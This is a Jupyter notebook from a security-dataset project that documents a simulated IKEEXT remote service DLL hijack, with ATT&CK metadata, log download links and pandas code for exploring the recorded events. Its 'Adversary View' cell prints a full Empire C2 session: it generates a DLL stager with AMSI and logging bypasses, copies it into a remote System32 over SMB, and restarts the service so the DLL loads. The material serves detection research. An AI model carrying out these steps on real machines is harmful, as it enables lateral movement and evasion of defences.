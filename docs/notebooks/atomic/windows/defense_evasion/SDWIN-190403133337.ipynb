{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "b375ff0d",
   "metadata": {},
   "source": [
    "# IKEEXT Remote Service DLL Hijack"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ba7c48c3",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e58aee33",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/04/03 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0003](https://attack.mitre.org/tactics/TA0003),[TA0004](https://attack.mitre.org/tactics/TA0004),[TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1574.001](https://attack.mitre.org/techniques/T1574/001) |\n",
    "| Tags              | Remote Service DLL Hijacking,RPC over SMB Svcctl |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6565276b",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries copying a file remotely to replace a file which is executed by a service that is vulnerable to DLL hijack. This dataset includes"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c5e48ca4",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0b34221a",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_shell_dcerpc_smb_service_dll_hijack.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_shell_dcerpc_smb_service_dll_hijack.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_shell_dcerpc_smb_service_dll_hijack.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_shell_dcerpc_smb_service_dll_hijack.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d376c30e",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "507d75a7",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c885e8ca",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [manual](None) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ced8138b",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: agents) > usestager windows/dll\n",
    "(Empire: stager/windows/dll) > info\n",
    "Name: DLL Launcher\n",
    "\n",
    "Description:\n",
    "  Generate a PowerPick Reflective DLL to inject with\n",
    "  stager code.\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value             Description\n",
    "  ----             --------    -------           -----------\n",
    "  Listener         True        http              Listener to use.\n",
    "  Language         True        powershell        Language of the stager to generate.\n",
    "  Arch             True        x64               Architecture of the .dll to generate\n",
    "                                                (x64 or x86).\n",
    "  StagerRetries    False       0                 Times for the stager to retry\n",
    "                                                connecting.\n",
    "  UserAgent        False       default           User-agent string to use for the staging\n",
    "                                                request (default, none, or other).\n",
    "  Proxy            False       default           Proxy to use for request (default, none,\n",
    "                                                or other).\n",
    "  ProxyCreds       False       default           Proxy credentials\n",
    "                                                ([domain\\]username:password) to use for\n",
    "                                                request (default, none, or other).\n",
    "  OutFile          True        /tmp/wlbsctrl.dll File to output dll to.\n",
    "  Obfuscate        False       False             Switch. Obfuscate the launcher\n",
    "                                                powershell code, uses the\n",
    "                                                ObfuscateCommand for obfuscation types.\n",
    "                                                For powershell only.\n",
    "  ObfuscateCommand False       Token\\All\\1       The Invoke-Obfuscation command to use.\n",
    "                                                Only used if Obfuscate switch is True.\n",
    "                                                For powershell only.\n",
    "  AMSIBypass       False       True              Include mattifestation's AMSI Bypass in\n",
    "                                                the stager code.\n",
    "  AMSIBypass2      False       False             Include Tal Liberman's AMSI Bypass in\n",
    "                                                the stager code.\n",
    "  ScriptLogBypass  False       True              Include cobbr's Script Block Log Bypass\n",
    "                                                in the stager code.\n",
    "  ETWBypass        False       False             Include tandasat's ETW bypass in the\n",
    "                                                stager code.\n",
    "\n",
    "(Empire: stager/windows/dll) > back\n",
    "(Empire: agents) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "  Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "  ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "  GCSKD17Z ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         1112   5/0.0    2020-09-22 03:51:02  http            \n",
    "\n",
    "(Empire: agents) > interact GCSKD17Z\n",
    "(Empire: GCSKD17Z) >\n",
    "(Empire: GCSKD17Z) > upload /tmp/wlbsctrl.dll\n",
    "[*] Tasked agent to upload wlbsctrl.dll, 124 KB\n",
    "(Empire: GCSKD17Z) > shell COPY .\\wlbsctrl.dll \\\\WORKSTATION6\\C$\\Windows\\System32\\wlbsctrl.dll\n",
    "[*] Tasked GCSKD17Z to run TASK_SHELL\n",
    "[*] Agent GCSKD17Z tasked with task ID 3\n",
    "(Empire: GCSKD17Z) > \n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: GCSKD17Z) > shell sc.exe `\\`\\WORKSTATION6 stop IKEEXT\n",
    "[*] Tasked GCSKD17Z to run TASK_SHELL\n",
    "[*] Agent GCSKD17Z tasked with task ID 4\n",
    "(Empire: GCSKD17Z) > \n",
    "SERVICE_NAME: IKEEXT \n",
    "        TYPE               : 30  WIN32  \n",
    "        STATE              : 3  STOP_PENDING \n",
    "                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n",
    "        WIN32_EXIT_CODE    : 0  (0x0)\n",
    "        SERVICE_EXIT_CODE  : 0  (0x0)\n",
    "        CHECKPOINT         : 0x0\n",
    "        WAIT_HINT          : 0x1388\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: GCSKD17Z) > shell sc.exe `\\`\\WORKSTATION6 query IKEEXT\n",
    "[*] Tasked GCSKD17Z to run TASK_SHELL\n",
    "[*] Agent GCSKD17Z tasked with task ID 5\n",
    "(Empire: GCSKD17Z) > \n",
    "SERVICE_NAME: IKEEXT \n",
    "        TYPE               : 20  WIN32_SHARE_PROCESS  \n",
    "        STATE              : 1  STOPPED \n",
    "        WIN32_EXIT_CODE    : 0  (0x0)\n",
    "        SERVICE_EXIT_CODE  : 0  (0x0)\n",
    "        CHECKPOINT         : 0x0\n",
    "        WAIT_HINT          : 0x0\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: GCSKD17Z) > shell sc.exe `\\`\\WORKSTATION6 start IKEEXT\n",
    "[*] Tasked GCSKD17Z to run TASK_SHELL\n",
    "[*] Agent GCSKD17Z tasked with task ID 6\n",
    "(Empire: GCSKD17Z) > \n",
    "SERVICE_NAME: IKEEXT \n",
    "        TYPE               : 30  WIN32  \n",
    "        STATE              : 2  START_PENDING \n",
    "                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n",
    "        WIN32_EXIT_CODE    : 0  (0x0)\n",
    "        SERVICE_EXIT_CODE  : 0  (0x0)\n",
    "        CHECKPOINT         : 0x0\n",
    "        WAIT_HINT          : 0x7d0\n",
    "        PID                : 6172\n",
    "        FLAGS              : \n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: GCSKD17Z) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "17127d5d",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d000f4f0",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e5d7186",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_shell_dcerpc_smb_service_dll_hijack.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9f76275c",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eb8be2c5",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d1148603",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "43aa9670",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8f9589cd",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992](https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
